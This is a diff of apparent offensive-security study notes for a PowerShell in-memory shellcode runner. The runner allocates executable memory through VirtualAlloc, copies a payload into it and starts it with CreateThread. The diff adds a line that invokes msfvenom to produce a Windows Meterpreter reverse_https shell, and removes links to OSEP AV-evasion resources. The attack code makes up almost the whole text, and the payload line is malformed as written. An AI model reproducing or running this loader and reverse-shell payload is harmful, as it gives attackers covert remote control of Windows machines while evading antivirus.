@@ -311,45 +311,23 @@ function getDelegateType {
         [Parameter(Position = 1)] [Type] $delType = [Void]
     ) 
  
-    $type = [AppDomain]::CurrentDomain.
-    DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), 
-        [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
-    DefineDynamicModules('InMemoryModule', $false).
-    DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
-    
-    $type.
-        DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).
-            SetImplementationFlags('Runtime, Managed')
-    
-    $type.
-        DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).
-            SetImplementationFlags('Runtime, Managed')
+    $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate]) 
+    $type.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).SetImplementationFlags('Runtime, Managed') 
+    $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).SetImplementationFlags('Runtime, Managed') 
      
     return $type.CreateType()
 }
 
 $lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAlloc), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)
 
-[Byte[]] $buf = 0xfc,0xe8,0x82,0x0,0x0,0x0
+[Byte[]] $buf = sudo msfvenom -p windows/meterpreter/reverse_https LHOST=IP LPORT=443 EXITFUNC=thread -f ps1
 
-[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $lpMem, $buf.length)s
+[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $lpMem, $buf.length)
 
 $hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateThread), (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$lpMem,[IntPtr]::Zero,0,[IntPtr]::Zero)
 
 [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WaitForSingleObject), (getDelegateType @([IntPtr], [Int32]) ([Int]))).Invoke($hThread, 0xFFFFFFFF)
 ```
-
-Resource:   
-- [Running ShellCode in Memory | AV Evasion – VBA Version – San3ncrypt3d Inc. – Making cybersecurity a habit & Privacy a Goal](https://san3ncrypt3d.com/2021/08/13/VBAShell/)
-- [OSEP-Breaking-Chains/Runners/Caesar-XOR-Staged-Shellcode-Runner.vb at main · gh0x0st/OSEP-Breaking-Chains (github.com)](https://github.com/gh0x0st/OSEP-Breaking-Chains/blob/main/Runners/Caesar-XOR-Staged-Shellcode-Runner.vb)     
-- [OSEP-Breaking-Chains/Runners/Caesar-XOR-Shellcode-Runner.vb at main · gh0x0st/OSEP-Breaking-Chains (github.com)](https://github.com/gh0x0st/OSEP-Breaking-Chains/blob/main/Runners/Caesar-XOR-Shellcode-Runner.vb)     
-- [OSEP-Code-Snippets/Simple Shellcode Runner/Simple Shellcode Runner.vba at main · chvancooten/OSEP-Code-Snippets (github.com)](https://github.com/chvancooten/OSEP-Code-Snippets/blob/main/Simple%20Shellcode%20Runner/Simple%20Shellcode%20Runner.vba)    
-
-
-
-
-
-
 
 
 
